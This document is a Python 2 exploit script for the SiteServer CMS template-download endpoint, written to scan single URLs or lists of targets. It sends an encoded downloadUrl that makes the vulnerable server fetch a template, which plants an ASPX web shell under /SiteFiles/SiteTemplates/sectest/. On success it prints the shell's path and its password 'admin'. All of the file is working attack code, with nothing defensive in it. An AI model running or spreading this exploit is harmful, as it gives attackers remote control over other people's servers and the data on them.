#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import sys
import requests
reload(sys)
sys.setdefaultencoding('utf-8')
    
def send_payload(target):
	payload = [r"/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest"]
	targets = target + payload[0]
	header_list = {
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
	}

	try:
		request = requests.get(target)
		if request.status_code == 404:
			print "[-] 404 not found " + target
		else:
			results = requests.get(targets,headers=header_list,timeout=3).text
			r = requests.get(targets,verify=False,timeout=6).text
			if '站点模板下载成功，请到站点模板管理中查看。' in r:
				print "[+] exists vulnerability " 
				print "WebShell: " + target + "/SiteFiles/SiteTemplates/sectest/include.aspx"
				print "PassWord:admin"
			else:
				print "[-] don't exists " + target
	except requests.ConnectionError:
		print "[-] Cannot connect url " + target

def read_url_list(files):
	for line in open(files):
		send_payload(line[:-1])

if __name__ == '__main__':
	print "\n[*] Start Check...\n"
	if sys.argv[1] == "-u":
		send_payload(sys.argv[2])
	elif sys.argv[1] == "-f":
		file = sys.argv[2]
		read_url_list(file)
